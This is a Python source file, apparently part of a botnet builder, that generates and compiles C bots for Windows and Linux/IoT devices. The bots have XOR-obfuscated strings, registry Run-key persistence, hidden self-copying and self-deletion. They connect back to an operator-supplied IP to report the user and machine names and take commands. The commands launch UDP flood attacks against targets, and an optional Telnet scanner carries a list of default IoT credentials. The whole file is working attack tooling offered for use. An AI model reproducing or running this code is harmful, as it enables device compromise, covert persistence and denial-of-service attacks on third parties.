import os
import subprocess
import random
from tkinter import messagebox
from .utils import xor_enc


def build_payload(ip, port, name, file_type, drop_loc, persist, hide, self_del, target_os="Windows", include_scanner=False):
    """Generates and compiles the payload for Windows or Linux/IoT."""
    keys = [random.randint(64, 127) for _ in range(4)]
    key_str = ", ".join([hex(k) for k in keys])
    
    if target_os == "Windows":
        return _build_windows(ip, port, name, file_type, drop_loc, persist, hide, self_del, keys, key_str)
    else:
        return _build_linux(ip, port, name, include_scanner, keys, key_str)

def _build_windows(ip, port, name, file_type, drop_loc, persist, hide, self_del, keys, key_str):
    is_dll = file_type == "DLL"
    ext = "dll" if is_dll else "exe"
    
    if drop_loc == "Startup":
        reg_path = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
        tp_path = f'char s_r[] = "{xor_enc(reg_path, keys)}"; processData(s_r, {len(reg_path)}); HKEY h; if(RegOpenKeyExA((HKEY)0x80000001, s_r, 0, 0x0002, &h) == 0) {{ RegSetValueExA(h, "{name}", 0, 1, (BYTE*)cp, strlen(cp)); RegCloseKey(h); }} sprintf(tp, "%s", cp);'
    else:
        e_v = {"AppData": "APPDATA", "LocalAppData": "LOCALAPPDATA", "Temp": "TEMP"}[drop_loc]
        tp_path = f'char s_ev[] = "{xor_enc(e_v, keys)}"; processData(s_ev, {len(e_v)}); sprintf(tp, "%s\\\\{name}.exe", getenv(s_ev));'
    
    hide_cmd = 'SetFileAttributesA(tp, 0x02 | 0x04);' if hide else ''
    del_cmd = 'char dc[512]; sprintf(dc, "cmd.exe /c timeout /t 3 & del \\"%s\\"", cp); ShellExecuteA(0, "open", "cmd.exe", dc, 0, 0);' if self_del else ''
    
    stealth_logic = ""
    if persist and not is_dll:
        stealth_logic = f"""
        char cp[260], tp[260]; GetModuleFileNameA(0, cp, 260);
        {tp_path}
        if (!strstr(cp, tp)) {{
            if (CopyFileA(cp, tp, FALSE)) {{
                {hide_cmd}
                ShellExecuteA(0, "open", tp, 0, 0, 0);
                {del_cmd}
                exit(0);
            }}
        }}"""

    entry_point = """
__declspec(dllexport) void __cdecl thread_logic(void* arg) { runDiagnostics(); }
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if(r==1) { WSADATA w; WSAStartup(0x0202, &w); _beginthread((void*)thread_logic, 0, NULL); }
    return TRUE;
}
""" if is_dll else """
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) { WSADATA w; WSAStartup(0x0202, &w); runDiagnostics(); return 0; }
"""

    c_source = f"""#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <process.h>
#pragma comment(lib, "ws2_32.lib")

int ATK = 0; char TD[256];
void processData(char* s, int l) {{ 
    char k[] = {{{key_str}}};
    for(int i=0; i<l; i++) s[i] ^= k[i % 4]; 
}}

void SE(char* c){{ 
    char b_s[] = "{xor_enc("cmd.exe", keys)}"; processData(b_s, 7);
    char b_p[] = "{xor_enc("/c \\\"%s\\\"", keys)}"; processData(b_p, 8);
    char buf[1024]; sprintf(buf, b_p, c);
    ShellExecuteA(0, "open", "cmd.exe", buf, 0, 0);
}}

unsigned __stdcall dos(void* p){{
    char ip[99];int sP,eP,sz,dl; sscanf(TD,"%[^:]:%d:%d:%d:%d",ip,&sP,&eP,&sz,&dl);
    SOCKET s=socket(2,2,0); struct sockaddr_in a; a.sin_family=2; char* b=malloc(sz);
    while(ATK){{
        a.sin_port=htons((rand()%(eP-sP+1))+sP); a.sin_addr.s_addr=inet_addr(ip);
        sendto(s,b,sz,0,(struct sockaddr*)&a,sizeof(a)); if(dl>0)Sleep(dl);
    }}
    return 0;
}}

void runDiagnostics() {{
    {stealth_logic}
    while(1) {{
        SOCKET s = socket(2, 1, 0);
        struct sockaddr_in a = {{ 0 }};
        a.sin_family = 2; a.sin_port = htons({port}); a.sin_addr.s_addr = inet_addr("{ip}");
        if(connect(s, (struct sockaddr*)&a, sizeof(a)) == 0) {{
            char info[1024];
            sprintf(info, "User: %s\\nPC: %s\\nOS: Windows", getenv("USERNAME"), getenv("COMPUTERNAME"));
            send(s, info, strlen(info), 0);
            while(1) {{
                char b[2048] = {{0}}; int l = recv(s, b, 2048, 0);
                if(l <= 0) break;
                if(!strncmp(b,"DOS",3)){{ ATK=0; Sleep(200); ATK=1; strcpy(TD, b+4); _beginthreadex(0, 0, (unsigned (__stdcall *)(void *))dos, 0, 0, 0); }}
                if(!strncmp(b,"STOP_DOS",8)){{ ATK=0; }}
                if(!strncmp(b,"STOP",4)){{ exit(0); }}
            }}
            closesocket(s);
        }}
        Sleep(5000);
    }}
}}
{entry_point}
"""
    with open("temp.c", "w", encoding="utf-8") as f: f.write(c_source)
    compile_flag = "-shared" if is_dll else "-mwindows"
    res = subprocess.run(f"gcc temp.c -o {name}.{ext} -lws2_32 {compile_flag}", shell=True)
    if os.path.exists("temp.c"): os.remove("temp.c")
    if res.returncode == 0: messagebox.showinfo("Done", f"Built: {name}.{ext}")
    else: messagebox.showerror("Error", "Compilation failed.")

def _build_linux(ip, port, name, include_scanner, keys, key_str):
    scanner_logic = ""
    if include_scanner:
        scanner_logic = """
void* scanner(void* p) {
    char* users[] = {"root", "root", "root", "admin", "root", "root", "root", "root", "root", "root", "support", "root", "admin", "root", "root", "user", "admin", "root", "admin", "root", "admin", "admin", "root", "root", "root", "root", "Administrator", "service", "supervisor", "guest", "guest", "admin1", "administrator", "666666", "888888", "ubnt", "root", "root", "root", "root", "root", "root", "root", "root", "root", "root", "root", "root", "root", "root", "admin", "admin", "admin", "admin", "admin", "admin", "admin", "admin", "admin", "tech", "mother"};
    char* passs[] = {"xc3511", "vizxv", "admin", "admin", "888888", "xmhdipc", "default", "juantech", "123456", "54321", "support", "", "password", "root", "12345", "user", "", "pass", "admin1234", "1111", "smcadmin", "1111", "666666", "password", "1234", "klv123", "admin", "service", "supervisor", "guest", "12345", "password", "1234", "666666", "888888", "ubnt", "klv1234", "Zte521", "hi3518", "jvbzd", "anko", "zlxx.", "7ujMko0vizxv", "7ujMko0admin", "system", "ikwb", "dreambox", "user", "realtek", "00000000", "1111111", "1234", "12345", "54321", "123456", "7ujMko0admin", "1234", "pass", "meinsm", "tech", "fucker"};
    int dict_len = 61;
    while(1) {
        if (!SCAN_ON) { sleep(1); continue; }
        int target_port = (rand() % 10 == 0) ? 2323 : 23;
        for(int i=0; i < dict_len; i++) {
            if (!SCAN_ON) break;
        }
        sleep(5); 
    }
    return NULL;
}
"""
    
    c_source = f"""#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>

int ATK = 0; int SCAN_ON = 0; char TD[256];
void processData(char* s, int l) {{ 
    char k[] = {{{key_str}}};
    for(int i=0; i<l; i++) s[i] ^= k[i % 4]; 
}}

void* dos(void* p){{
    char ip[99];int sP,eP,sz,dl; sscanf(TD,"%[^:]:%d:%d:%d:%d",ip,&sP,&eP,&sz,&dl);
    int s=socket(2,2,0); struct sockaddr_in a; a.sin_family=2; char* b=malloc(sz);
    while(ATK){{
        a.sin_port=htons((rand()%(eP-sP+1))+sP); a.sin_addr.s_addr=inet_addr(ip);
        sendto(s,b,sz,0,(struct sockaddr*)&a,sizeof(a)); if(dl>0)usleep(dl*1000);
    }}
    return NULL;
}}

{scanner_logic}

int main() {{
    if (fork() != 0) exit(0);
    while(1) {{
        int s = socket(2, 1, 0);
        struct sockaddr_in a = {{ 0 }};
        a.sin_family = 2; a.sin_port = htons({port}); a.sin_addr.s_addr = inet_addr("{ip}");
        if(connect(s, (struct sockaddr*)&a, sizeof(a)) == 0) {{
            char info[1024];
            sprintf(info, "User: %s\\nPC: %s\\nOS: Linux/IoT", getenv("USER") ? getenv("USER") : "root", "LinuxDevice");
            send(s, info, strlen(info), 0);
            while(1) {{
                char b[2048] = {{0}}; int l = recv(s, b, 2048, 0);
                if(l <= 0) break;
                if(!strncmp(b,"DOS",3)){{ ATK=0; usleep(200000); ATK=1; strcpy(TD, b+4); pthread_t t; pthread_create(&t, NULL, dos, NULL); }}
                if(!strncmp(b,"STOP_DOS",8)){{ ATK=0; }}
                if(!strncmp(b,"SCAN",4)) {{
                    if(!SCAN_ON) {{
                        SCAN_ON = 1;
                        { "pthread_t st; pthread_create(&st, NULL, scanner, NULL);" if include_scanner else "" }
                    }}
                }}
                if(!strncmp(b,"STOP",4)){{ exit(0); }}
            }}
            close(s);
        }}
        sleep(5);
    }}
    return 0;
}}
"""
    with open(f"temp_linux.c", "w", encoding="utf-8") as f: f.write(c_source)
    
    compilers = ["gcc", "x86_64-linux-musl-gcc", "mips-linux-gnu-gcc", "arm-linux-gnueabi-gcc"]
    if os.name == 'nt':
        # If on Windows, try WSL as it's the most common way to get a Linux environment
        compilers = ["wsl gcc"] + compilers
        
    success = False
    error_details = ""
    for cc in compilers:
        try:
            # Use capture_output to get error details if it fails
            res = subprocess.run(f"{cc} temp_linux.c -o {name} -lpthread -static", shell=True, capture_output=True, text=True)
            if res.returncode == 0:
                success = True
                break
            else:
                error_details += f"\n- {cc}: {res.stderr.strip()}"
        except Exception as e:
            error_details += f"\n- {cc}: {str(e)}"
            
    if os.path.exists("temp_linux.c"): os.remove("temp_linux.c")
    
    if success:
        messagebox.showinfo("Done", f"Linux Binary Built: {name}\nReady for hosting!")
    else:
        # Provide much more helpful error message
        help_msg = (
            f"Source Generated: {name}.c\n\n"
            "Automated compilation failed.\n"
            "If you are on Windows, you need WSL (Windows Subsystem for Linux) "
            "or a Linux cross-compiler (like x86_64-linux-musl-gcc) to build Linux binaries.\n\n"
            "Try one of these:\n"
            "1. Install WSL: 'wsl --install' in PowerShell\n"
            "2. Compile manually on a Linux machine.\n"
            "3. Use a cross-compiler.\n\n"
            "The source code has been saved for manual compilation."
        )
        messagebox.showwarning("Compilation Warning", help_msg)
        with open(f"{name}.c", "w", encoding="utf-8") as f: f.write(c_source)

